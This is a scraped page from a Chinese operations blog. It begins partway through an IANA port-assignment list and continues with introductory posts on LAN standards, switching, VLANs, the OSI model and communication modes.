fg-sysupdate	<span class="token number">6550</span>/tcp   fg-sysupdate
fg-sysupdate	<span class="token number">6550</span>/udp   fg-sysupdate
<span class="token comment">#			   Mark Beyer </span>
<span class="token function">sum</span>		<span class="token number">6551</span>/tcp   Software Update Manager
<span class="token function">sum</span>		<span class="token number">6551</span>/udp   Software Update Manager
<span class="token comment">#			   Jan Dirven  13 December 2007</span>
<span class="token comment">#               6552-6557  Unassigned</span>
xdsxdm		<span class="token number">6558</span>/tcp
xdsxdm		<span class="token number">6558</span>/udp
<span class="token comment">#                          Brian Tackett  possible contact</span>
<span class="token comment">#               6559-6565  Unassigned</span>
sane-port       <span class="token number">6566</span>/tcp   SANE Control Port
sane-port       <span class="token number">6566</span>/udp   SANE Control Port
<span class="token comment">#                          Henning Meier-Geinitz  October 2002</span>
esp		<span class="token number">6567</span>/tcp   eSilo Storage Protocol
esp		<span class="token number">6567</span>/udp   eSilo Storage Protocol
<span class="token comment">#			   Andrew Chernow  January 2007</span>
canit_store     <span class="token number">6568</span>/tcp   CanIt Storage Manager
<span class="token comment">#                          David F. Skoll  22 April 2009</span>
<span class="token comment">#               6568/udp   Reserved</span>
<span class="token comment">#               6569-6578  Unassigned</span>
affiliate	<span class="token number">6579</span>/tcp   Affiliate
affiliate	<span class="token number">6579</span>/udp   Affiliate
<span class="token comment">#			   David Catmull  January 2006</span>
parsec-master   <span class="token number">6580</span>/tcp   Parsec Masterserver
parsec-master   <span class="token number">6580</span>/udp   Parsec Masterserver
parsec-peer     <span class="token number">6581</span>/tcp   Parsec Peer-to-Peer
parsec-peer     <span class="token number">6581</span>/udp   Parsec Peer-to-Peer
parsec-game     <span class="token number">6582</span>/tcp   Parsec Gameserver
parsec-game     <span class="token number">6582</span>/udp   Parsec Gameserver
<span class="token comment">#                          Andreas Varga </span>
joaJewelSuite   <span class="token number">6583</span>/tcp   JOA Jewel Suite
joaJewelSuite   <span class="token number">6583</span>/udp   JOA Jewel Suite
<span class="token comment">#                          Bob Rundle  November 2005</span>
<span class="token comment">#               6584-6587  Unassigned</span>
<span class="token comment">#               6588       Unassigned</span>
<span class="token comment">####Unofficial use of port 6588 by AnalogX and Microsoft####</span>
<span class="token comment">#               6589-6599  Unassigned</span>
mshvlm          <span class="token number">6600</span>/tcp   Microsoft Hyper-V Live Migration
<span class="token comment">#                          Rajesh Davé  03 February 2009</span>
<span class="token comment">#               6600/udp   Reserved</span>
mstmg-sstp      <span class="token number">6601</span>/tcp   Microsoft Threat Management Gateway SSTP
<span class="token comment">#                          Ori Yosefi  04 May 2009</span>
<span class="token comment">#               6601/udp   Reserved</span>
<span class="token comment">#               6602-6618  Unassigned</span>
odette-ftps	<span class="token number">6619</span>/tcp   ODETTE-FTP over TLS/SSL
odette-ftps	<span class="token number">6619</span>/udp   ODETTE-FTP over TLS/SSL
<span class="token comment">#			   Ieuan Friend  March 2006</span>
<span class="token comment">#                          [RFC5024]</span>
kftp-data       <span class="token number">6620</span>/tcp   Kerberos V5 FTP Data
kftp-data       <span class="token number">6620</span>/udp   Kerberos V5 FTP Data
kftp            <span class="token number">6621</span>/tcp   Kerberos V5 FTP Control
kftp            <span class="token number">6621</span>/udp   Kerberos V5 FTP Control
<span class="token comment">#                          Robert J. Scott  August 2005</span>
mcftp		<span class="token number">6622</span>/tcp   Multicast FTP
mcftp		<span class="token number">6622</span>/udp   Multicast FTP
<span class="token comment">#			   Bruce Lueckenhoff  February 2006</span>
ktelnet         <span class="token number">6623</span>/tcp   Kerberos V5 Telnet
ktelnet         <span class="token number">6623</span>/udp   Kerberos V5 Telnet
<span class="token comment">#                          Robert J. Scott  August 2005</span>
<span class="token comment">#               6624-6625  Unassigned</span>
wago-service	<span class="token number">6626</span>/tcp   WAGO Service and Update
wago-service	<span class="token number">6626</span>/udp   WAGO Service and Update
<span class="token comment">#			   Wolfgang Adler  April 2006</span>
nexgen          <span class="token number">6627</span>/tcp   Allied Electronics NeXGen
nexgen          <span class="token number">6627</span>/udp   Allied Electronics NeXGen
<span class="token comment">#                          Lou Seitchik  August 2005</span>
afesc-mc        <span class="token number">6628</span>/tcp   AFE Stock Channel M/C
afesc-mc        <span class="token number">6628</span>/udp   AFE Stock Channel M/C
<span class="token comment">#                          K.K Ho  April 2004</span>
<span class="token comment">#               6629-6630  Unassigned</span>
<span class="token comment">#               6631       Unassigned (Returned 28 May 2004)</span>
<span class="token comment">#               6632-6664  Unassigned</span>
ircu		<span class="token number">6665</span>-6669/tcp  IRCU
ircu		<span class="token number">6665</span>-6669/udp  IRCU
<span class="token comment">#			               Brian Tackett </span>
vocaltec-gold   <span class="token number">6670</span>/tcp   Vocaltec Global Online Directory
vocaltec-gold   <span class="token number">6670</span>/udp   Vocaltec Global Online Directory
<span class="token comment">#                          Scott Petrack </span>
p4p-portal      <span class="token number">6671</span>/tcp   P4P Portal Service
p4p-portal      <span class="token number">6671</span>/udp   P4P Portal Service
<span class="token comment">#                          Chris Griffiths  28 July 2008</span>
vision_server   <span class="token number">6672</span>/tcp   vision_server
vision_server   <span class="token number">6672</span>/udp   vision_server
vision_elmd     <span class="token number">6673</span>/tcp   vision_elmd
vision_elmd     <span class="token number">6673</span>/udp   vision_elmd
<span class="token comment">#                          Chris Kramer </span>
<span class="token comment">#               6674-6699  Unassigned</span>
frc-hp          <span class="token number">6700</span>/sctp  ForCES HP <span class="token punctuation">(</span>High Priority<span class="token punctuation">)</span> channel
<span class="token comment">#                          Jamal Hadi Salim  04 August 2009</span>
kti-icad-srvr	<span class="token number">6701</span>/tcp   KTI/ICAD Nameserver
kti-icad-srvr	<span class="token number">6701</span>/udp   KTI/ICAD Nameserver
<span class="token comment">#			               Stanley Knutson </span>
frc-mp          <span class="token number">6701</span>/sctp  ForCES MP <span class="token punctuation">(</span>Medium Priority<span class="token punctuation">)</span> channel
<span class="token comment">#                          Jamal Hadi Salim  04 August 2009</span>
frc-lp          <span class="token number">6702</span>/sctp  ForCES LP <span class="token punctuation">(</span>Low priority<span class="token punctuation">)</span> channel
<span class="token comment">#                          Jamal Hadi Salim  04 August 2009</span>
e-design-net    <span class="token number">6702</span>/tcp   e-Design network
e-design-net    <span class="token number">6702</span>/udp   e-Design network
e-design-web    <span class="token number">6703</span>/tcp   e-Design web
e-design-web    <span class="token number">6703</span>/udp   e-Design web
<span class="token comment">#			   Janos Lerch  February 2006</span>
<span class="token comment">#               6704-6713  Unassigned</span>
ibprotocol      <span class="token number">6714</span>/tcp   Internet Backplane Protocol
ibprotocol      <span class="token number">6714</span>/udp   Internet Backplane Protocol
<span class="token comment">#                          Alessandro Bassi </span>
fibotrader-com  <span class="token number">6715</span>/tcp   Fibotrader Communications
fibotrader-com  <span class="token number">6715</span>/udp   Fibotrader Communications
<span class="token comment">#			   Robert Wetzold  January 2006</span>
<span class="token comment">#               6716-6766  Unassigned</span>
bmc-perf-agent  <span class="token number">6767</span>/tcp   BMC PERFORM AGENT
bmc-perf-agent  <span class="token number">6767</span>/udp   BMC PERFORM AGENT
bmc-perf-mgrd   <span class="token number">6768</span>/tcp   BMC PERFORM MGRD
bmc-perf-mgrd   <span class="token number">6768</span>/udp   BMC PERFORM MGRD
<span class="token comment">#                          Portnoy Boxman </span>
adi-gxp-srvprt  <span class="token number">6769</span>/tcp   ADInstruments GxP Server
adi-gxp-srvprt  <span class="token number">6769</span>/udp   ADInstruments GxP Server
<span class="token comment">#                          Mathew Pitchforth  August 2005</span>
plysrv-http     <span class="token number">6770</span>/tcp   PolyServe http
plysrv-http     <span class="token number">6770</span>/udp   PolyServe http
plysrv-https    <span class="token number">6771</span>/tcp   PolyServe https
plysrv-https    <span class="token number">6771</span>/udp   PolyServe https
<span class="token comment">#                          Mike Spitzer  August 2005</span>
<span class="token comment">#               6772-6784  Unassigned</span>
dgpf-exchg	<span class="token number">6785</span>/tcp   DGPF Individual Exchange
dgpf-exchg	<span class="token number">6785</span>/udp   DGPF Individual Exchange
<span class="token comment">#			   Thomas Weise  April 2006</span>
smc-jmx         <span class="token number">6786</span>/tcp   Sun Java Web Console JMX
smc-jmx         <span class="token number">6786</span>/udp   Sun Java Web Console JMX
smc-admin       <span class="token number">6787</span>/tcp   Sun Web Console Admin
smc-admin       <span class="token number">6787</span>/udp   Sun Web Console Admin
<span class="token comment">#                          Bill Edwards  August 2005</span>
smc-http        <span class="token number">6788</span>/tcp   SMC-HTTP
smc-http        <span class="token number">6788</span>/udp   SMC-HTTP
<span class="token comment">#                          Ratnadeep Bhattacharjee  November 2002</span>
smc-https       <span class="token number">6789</span>/tcp   SMC-HTTPS
smc-https       <span class="token number">6789</span>/udp   SMC-HTTPS
<span class="token comment">#                          Ratnadeep Bhattacharjee  August 2002</span>
hnmp            <span class="token number">6790</span>/tcp   HNMP
hnmp            <span class="token number">6790</span>/udp   HNMP
<span class="token comment">#                          Jude George </span>
hnm             <span class="token number">6791</span>/tcp   Halcyon Network Manager
hnm             <span class="token number">6791</span>/udp   Halcyon Network Manager
<span class="token comment">#                          Richard Harriss  May 2005</span>
<span class="token comment">#               6792-6800  Unassigned</span>
acnet		<span class="token number">6801</span>/tcp   ACNET Control System Protocol
acnet		<span class="token number">6801</span>/udp   ACNET Control System Protocol
<span class="token comment">#			   Rich Neswold  February 2007</span>
<span class="token comment">#               6802-6830  Unassigned</span>
ambit-lm        <span class="token number">6831</span>/tcp   ambit-lm
ambit-lm        <span class="token number">6831</span>/udp   ambit-lm
<span class="token comment">#                          Don Hejna </span>
<span class="token comment">#               6832-6840  Unassigned</span>
netmo-default	<span class="token number">6841</span>/tcp   Netmo Default
netmo-default	<span class="token number">6841</span>/udp   Netmo Default
netmo-http	<span class="token number">6842</span>/tcp   Netmo HTTP
netmo-http	<span class="token number">6842</span>/udp   Netmo HTTP
<span class="token comment">#			   Urs Bertschinger </span>
<span class="token comment">#               6843-6849   Unassigned</span>
iccrushmore     <span class="token number">6850</span>/tcp    ICCRUSHMORE
iccrushmore     <span class="token number">6850</span>/udp    ICCRUSHMORE
<span class="token comment">#                           Dave Hubbard </span>
<span class="token comment">#               6851-6887   Unassigned</span>
muse            <span class="token number">6888</span>/tcp    MUSE
muse            <span class="token number">6888</span>/udp    MUSE
<span class="token comment">#                           Muse Communications Corporation</span>
<span class="token comment">#                           </span>
<span class="token comment">#               6889-6935   Unassigned</span>
xsmsvc		<span class="token number">6936</span>/tcp    XenSource Management Service
xsmsvc		<span class="token number">6936</span>/udp    XenSource Management Service
<span class="token comment">#			    Roger Klorese  June 2006</span>
<span class="token comment">#               6937-6945   Unassigned</span>
bioserver       <span class="token number">6946</span>/tcp    Biometrics Server
bioserver       <span class="token number">6946</span>/udp    Biometrics Server
<span class="token comment">#			    ISHII AKIO  January 2006</span>
<span class="token comment">#               6947-6950   Unassigned</span>
otlp		<span class="token number">6951</span>/tcp    OTLP
otlp		<span class="token number">6951</span>/udp    OTLP
<span class="token comment">#			    Brent Foster  April 2006</span>
<span class="token comment">#               6952-6960   Unassigned</span>
jmact3          <span class="token number">6961</span>/tcp    JMACT3
jmact3          <span class="token number">6961</span>/udp    JMACT3
jmevt2          <span class="token number">6962</span>/tcp    jmevt2
jmevt2          <span class="token number">6962</span>/udp    jmevt2
swismgr1        <span class="token number">6963</span>/tcp    swismgr1
swismgr1    	<span class="token number">6963</span>/udp    swismgr1
swismgr2        <span class="token number">6964</span>/tcp    swismgr2
swismgr2        <span class="token number">6964</span>/udp    swismgr2
swistrap        <span class="token number">6965</span>/tcp    swistrap
swistrap        <span class="token number">6965</span>/udp    swistrap
swispol         <span class="token number">6966</span>/tcp    swispol
swispol         <span class="token number">6966</span>/udp    swispol
<span class="token comment">#                           Yutaka Ono </span>
<span class="token comment">#               6967-6968   Unassigned</span>
acmsoda         <span class="token number">6969</span>/tcp    acmsoda
acmsoda         <span class="token number">6969</span>/udp    acmsoda
<span class="token comment">#                           Daniel Simms </span>
<span class="token comment">#               6970-6996   Unassigned</span>
MobilitySrv	<span class="token number">6997</span>/tcp    Mobility XE Protocol
MobilitySrv	<span class="token number">6997</span>/udp    Mobility XE Protocol
<span class="token comment">#			    Joseph T Savarese  June 2007</span>
iatp-highpri	<span class="token number">6998</span>/tcp    IATP-highPri
iatp-highpri	<span class="token number">6998</span>/udp    IATP-highPri
iatp-normalpri	<span class="token number">6999</span>/tcp    IATP-normalPri
iatp-normalpri	<span class="token number">6999</span>/udp    IATP-normalPri</code></pre>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block ljk-index-post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://blog.lujinkai.cn/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/%E7%BD%91%E7%BB%9C/%E5%B1%80%E5%9F%9F%E7%BD%91/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="//img.to2b.cn/blog/ljk/1607154764582.png">
      <meta itemprop="name" content="像方便面一样的男子">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="LJKのBlog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | LJKのBlog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/%E7%BD%91%E7%BB%9C/%E5%B1%80%E5%9F%9F%E7%BD%91/" class="post-title-link" itemprop="url">局域网</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-01-01 22:30:16" itemprop="dateCreated datePublished" datetime="2021-01-01T22:30:16+08:00">2021-01-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-05-29 16:58:05" itemprop="dateModified" datetime="2023-05-29T16:58:05+08:00">2023-05-29</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/" itemprop="url" rel="index"><span itemprop="name">运维</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index"><span itemprop="name">基础</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="局域网标准"><a href="#局域网标准" class="headerlink" title="局域网标准"></a>局域网标准</h2><p>局域网标准：IEEE802，802 标准所描述的局域网参考模型只对应 OSI 参考模型的数据链路层与物理层，它将数据链路层划分为逻辑链路层 LLC 子层和介质访问控制 MAC 子层</p>
<ul>
<li>LLC 子层负责向其上层提供服务</li>
<li>MAC 子层的主要功能包括数据帧的封装&#x2F;卸装，帧的寻址和识别，帧的接收与发送，链路的管理，帧的差错控制等。MAC 子层的存在屏蔽了不同物理链路种类的差异性</li>
</ul>
<p>802 细分成各个小的局域网标准</p>
<ul>
<li>IEEE802.1 早期局域网标准</li>
<li>IEEE802.2 工作在 LLC 层，LLC 层为上一层也就是网络层提供服务，为了兼容早期的 802.3</li>
<li>IEEE802.3 工作在物理层和 MAC 层，早期的 802.3 没有说清楚上层物理层是什么协议，它认为只有一种协议 ipx，现在 ipx 已经淘汰了，主流是 ip 协议。所以它需要配合 802.2 来表示上层协议的类型。</li>
<li>IEEE802.11 无线局域网技术<ul>
<li>802.11b — WiFi 1 (1999)</li>
<li>802.11a — WiFi 2 (1999)</li>
<li>802.11g — WiFi 3 (2003)</li>
<li>802.11n — WiFi 4 (2009)</li>
<li>802.11ac — WiFi 5(2014)</li>
<li>802.11ax — WiFi 6(2018)</li>
</ul>
</li>
</ul>
<p>IEEE802.3+IEEE802.2 的组合也不方便，所以实际中我们也不使用这种标准，使用的是 Etherent V2 以太网第二版协议</p>
<p><img data-src="//img.to2b.cn/blog/ljk/1598084924665.png"></p>
<p>前 8 个字节 Preamble 是前导信息；最后 4 个字节 FCS 是校验位；Destination Address 是接收方的 MAC 地址，Source Address 是发送方的 MAC 地址，MAC 地址是 48 位，也就是 6 个字节；type 指定上层接收数据的协议类型（ip），length 说明后面数据的长度</p>
<h2 id="组网设备"><a href="#组网设备" class="headerlink" title="组网设备"></a>组网设备</h2><table>
    <tr style="background-color:#eee">
        <td rowspan="3"><img data-src="//img.to2b.cn/blog/ljk/1598060737847.png" alt=""></td>
        <td>switch：交换机，最常见</td>
    </tr>
    <tr style="background-color:#eee">
        <td>router: 路由器</td>
    </tr>
    <tr style="background-color:#eee">
        <td>hub：集线器，很便宜，已淘汰</td>
    </tr>
</table>

<h3 id="配线架、跳线"><a href="#配线架、跳线" class="headerlink" title="配线架、跳线"></a>配线架、跳线</h3><p>网线先接到配线架上，在通过跳线连接到交换机。因为网线比较长，而且一般都固定在地上或墙上，一旦坏了不方便拆换，所以网线一旦插好了就不动了，如果有调整，只动跳线就可以了，跳线比较短</p>
<h3 id="网线、光纤"><a href="#网线、光纤" class="headerlink" title="网线、光纤"></a>网线、光纤</h3><p>工作在物理层</p>
<h3 id="网络适配器"><a href="#网络适配器" class="headerlink" title="网络适配器"></a>网络适配器</h3><p>简称网卡，工作在数据链路层。进行串行&#x2F;并行转换、数据缓存、在计算机操作系统中安装设备驱动程序、实现以太网协议</p>
<p>一张网卡可能有一个或多个接口</p>
<p><img data-src="//img.to2b.cn/blog/ljk/1598062823623.png" style="zoom: 50%;" /><img data-src="//img.to2b.cn/blog/ljk/1598874897322.png" style="zoom:50%;" /></p>
<h3 id="中继器和集线器"><a href="#中继器和集线器" class="headerlink" title="中继器和集线器"></a>中继器和集线器</h3><p>工作在物理层。远距离传输，信号有衰减，中继器可以放大信号，但当负载增加时，网络性能急剧下降；集线器可以认为是一个多端口的中继器，也可以放大信号，它工作模式基于广播机制，不安全。连接在同一集线器的电脑处于同一冲突域和同一广播域，所以所有电脑通信是半双工，而且共享带宽。</p>
<h3 id="网桥和交换机"><a href="#网桥和交换机" class="headerlink" title="网桥和交换机"></a>网桥和交换机</h3><p>两者工作逻辑是一样的，都工作在数据链路层、每个端口可提供专用的带宽、全双工通信。</p>
<h4 id="网桥"><a href="#网桥" class="headerlink" title="网桥"></a>网桥</h4><p>也叫桥接器，是连接两个局域网的一种存储&#x2F;转发设备，网桥中缓存连接设备的 MAC 地址，并将 MAC 地址和其连接端口对应起来，网桥判断发送方 MAC 和接受方 MAC 连接的是同一端口，说明它俩处于同一个局域网，就不会向其他局域网发送信息，这样就隔绝了冲突域<br><img data-src="//img.to2b.cn/blog/ljk/1598065993943.png"></p>
<h4 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h4><p>相比网桥，端口更多，网桥一个端口连接一个局域网，交换机一个端口连接一台电脑，所以彻底解决冲突域的问题</p>
<ol>
<li>交换机根据收到数据帧中的源 MAC 地址建立该地址同交换机端口的映射，并将其写入 MAC 地址表中</li>
<li>交换机将数据帧中的目的 MAC 地址同已建立的 MAC 地址表进行比较，以决定由哪个端口进行转发</li>
<li>如数据帧中的目的 MAC 地址不在 MAC 地址表中，则向所有端口转发。这一过程称为泛洪（flood）</li>
<li>广播帧和组播帧向所有的端口转发</li>
</ol>
<h3 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h3><p>网桥和交换机可以隔离冲突域，但是无法隔离广播域： ① 交换机接收到广播帧会广播；② 接到单播看 mac 表有没有学到对应目的 mac 的缓存，没有的话还是会广播</p>
<p>所以需要在交换机前面加上一个路由器， 路由器可以隔绝广播</p>
<p>交换机是二层设备，路由器是三层设备，判断设备在几层是由设备的最高功能决定的，三层设备能处理一层和二层信息，反之二层设备不能处理三层的信息</p>
<h2 id="以太网技术"><a href="#以太网技术" class="headerlink" title="以太网技术"></a>以太网技术</h2><p>以太网（Ethernet）是一种产生较早且使用相当广泛的局域网。</p>
<p>现在大部分的局域网均为以太网，因此一般提及局域网都会默认为以太网。</p>
<h3 id="MAC-地址"><a href="#MAC-地址" class="headerlink" title="MAC 地址"></a>MAC 地址</h3><p>48 位，固化在网卡 ROM 中，IEEE 的注册管理机构 RA 负责向厂家分配地址字段的前三个字节(即高位 24 位)，后三个字节(即低位 24 位)由厂家自行指派，称为扩展标识符，必须保证生产出的适配器没有重复地址。</p>
<p>发送数据的时候，在接收方 MAC 地址中注明这条数据是单播、组播还是多播。MAC 地址由 6 字节 48bit 组成，第 48bit（即第 1 个字节的最后 1bit）如果为 0 说明这条数据是单播。如果为 1 说明这条数据是组播或者多播。多播只有一种情况，就是 MAC 地址的 48bit 全部都是 1：FF FF FF FF FF FF。</p>
<p>显然：组播和多播的 MAC 地址是逻辑地址，在网络上，没有一个设备的 MAC 地址是一个组播 MAC 地址或者多播地址 FF FF FF FF FF FF。对于网络设备上固化的 MAC 地址，只能是单播地址，也就是 MAC 帧中的发送方的 MAC 地址第 48 位只能 0。</p>
<p>接收数据，在二层根据接收方 MAC 地址的 48bit 判断单播、组播还是多播。如果是单播，再判断接收方 MAC 地址是否为自身的 MAC 地址，不是就丢弃；如果是多播，无条件接收；如果是组播，判断是否为本机监听的组播，不是就丢弃。</p>
<ul>
<li>发送端发送组播包时，目的 mac 地址是根据组播 ip 和固定格式进行映射，并没有指向固定目标主机，向网络上进行发送。</li>
<li>接收端接收组播包时，同样需要对组播 ip 和固定格式进行映射，生成的组播 mac 地址与接收到的数据包 mac 比对，若相通往上传。</li>
</ul>
<p>路由器可以不接受广播和组播</p>
<h2 id="虚拟局域网-VLAN"><a href="#虚拟局域网-VLAN" class="headerlink" title="虚拟局域网 VLAN"></a>虚拟局域网 VLAN</h2><p>企业内部的局域网，尤其是比较大的局域网，有很多交换机，交换机不隔离广播，所以一台 PC 发送消息，通过路由器、核心交换机广播到局域网中所有的 PC，这样是不合理的。路由器可以隔离，但是在企业内部是不会用路由器来隔离广播的，因为路由器很贵，而且接口比较少，所以一般只用来连接外网。家用的路由器实际上是交换机和路由器的结合体。</p>
<p>可以给交换机增加隔离广播域的功能，实现原理是通过<strong>软件</strong>实现逻辑上的局域网，即虚拟局域网 VLAN。</p>
<p>简单理解：</p>
<p>交换机有很多端口，交换机缓存端口和 vlan 的关联，这样，从一个网口出来的以太帧，只广播到与之关联的 vlan 关联的端口，这样就隔离了广播。当然，一个 vlan 关联的网口可能处于不同的交换机，所以需要制定一个协议（trunk 协议），在发送给其他交换机的广播的帧中塞入一个标签，注明来自哪个 vlan。</p>
<p>实现 vlan，除了基于端口划分，也可以基于 MAC、协议、网络地址来划分。</p>
<p>trunk 协议给塞入的标签分配了 4 个字节，其中只有 12 个 bit 用来表示来自哪个 VLAN，可以表示 2^12 个 VLAN，对于普通的局域网是够的，但是对于云服务商不够，例如阿里云，成千上万企业在阿里云购买主机，阿里云需要把每个企业的服务器隔离开来，4 千多个个 VLAN 不够用。使用 VXLAN 技术可以解决这个问题</p>
<p><img data-src="//img.to2b.cn/blog/lujinkai/1663565223763.png" alt="IEEE 802.1Q封装的VLAN数据帧格式"></p>
<h2 id="分层的网络架构"><a href="#分层的网络架构" class="headerlink" title="分层的网络架构"></a>分层的网络架构</h2><p>比较完善的网络架构可以分成三层：访问层、分布层、核心层。</p>
<img data-src="//img.to2b.cn/blog/ljk/1598177029080.png" style="zoom: 80%;" />

<p><img data-src="//img.to2b.cn/blog/ljk/1598179484630.png"></p>
<p><img data-src="//img.to2b.cn/blog/ljk/1598179517916.png"></p>
<p>11.1 40min-52min</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block ljk-index-post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://blog.lujinkai.cn/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="//img.to2b.cn/blog/ljk/1607154764582.png">
      <meta itemprop="name" content="像方便面一样的男子">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="LJKのBlog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | LJKのBlog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">网络基础</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-01-01 22:26:35" itemprop="dateCreated datePublished" datetime="2021-01-01T22:26:35+08:00">2021-01-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-05-29 16:58:05" itemprop="dateModified" datetime="2023-05-29T16:58:05+08:00">2023-05-29</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/" itemprop="url" rel="index"><span itemprop="name">运维</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index"><span itemprop="name">基础</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="网络概念"><a href="#网络概念" class="headerlink" title="网络概念"></a>网络概念</h2><p>计算机网络是一组计算机或网络设备通过有形的线缆或无形的媒介如无线，连接起来，按照一定的规则，进行通信的集合。</p>
<p>按照作用范围分类：广域网、城域网、局域网。</p>
<h2 id="网络特征"><a href="#网络特征" class="headerlink" title="网络特征"></a>网络特征</h2><h3 id="网络速度（带宽）"><a href="#网络速度（带宽）" class="headerlink" title="网络速度（带宽）"></a>网络速度（带宽）</h3><p>Mbps 是 Million bits per second 的缩写，是一种传输速率单位，指每秒传输的位（比特）数量。</p>
<img data-src="//img.to2b.cn/blog/ljk/1598019120673.png" style="zoom:80%;" />

<h3 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h3><p>分为物理拓扑和逻辑拓扑。物理拓扑描述了物理设备的布线方式；逻辑拓扑描述了信息在网络中流动的方式。</p>
<h2 id="网络标准"><a href="#网络标准" class="headerlink" title="网络标准"></a>网络标准</h2><h3 id="OSI-模型七层结构"><a href="#OSI-模型七层结构" class="headerlink" title="OSI 模型七层结构"></a>OSI 模型七层结构</h3><p>从上往下依次为：应用层、表示层、会话层、传输层、网络层、数据链路层、物理层。</p>
<ol>
<li>第 1 层 物理层</li>
<li>第 2 层 数据链接层</li>
<li>第 3 层 网络层</li>
<li>第 4 层 传输层</li>
</ol>
<p>OSI 模型仅仅是一种理论，因为太过繁琐，并没有实际应用 ，实际应用的是 TCP&#x2F;IP 协议。</p>
<h3 id="网络的通信过程"><a href="#网络的通信过程" class="headerlink" title="网络的通信过程"></a>网络的通信过程</h3><p>发送方从应用层发送数据，经过层层封装，最后通过物理层将数据发送出去。接收方的物理层接受到数据，经过层层解封，最后在应用层将数据展示给用户</p>
<p><img data-src="//img.to2b.cn/blog/ljk/1598021827338.png"></p>
<p>PDU：Protocol Data Unit，协议数据单元是指对等层次之间传递的数据单位</p>
<ul>
<li>物理层的 PDU 是数据位 bit</li>
<li>数据链路层的 PDU 是数据帧 frame</li>
<li>网络层的 PDU 是数据包 packet</li>
<li>传输层的 PDU 是数据段 segment，<ul>
<li>因为二层的数据中包含 MAC 地址，所以二层的数据又叫 MAC 帧</li>
</ul>
</li>
<li>其他更高层次的 PDU 是消息 message</li>
</ul>
<p><img data-src="//img.to2b.cn/blog/ljk/1598021924915.png"></p>
<h3 id="三种通讯模式"><a href="#三种通讯模式" class="headerlink" title="三种通讯模式"></a>三种通讯模式</h3><pre class="language-none"><code class="language-none">unicast：单播，目标设备是一个
broadcast：广播，目标设备是所有
multicast：多播、组播，目标设备是多个</code></pre>

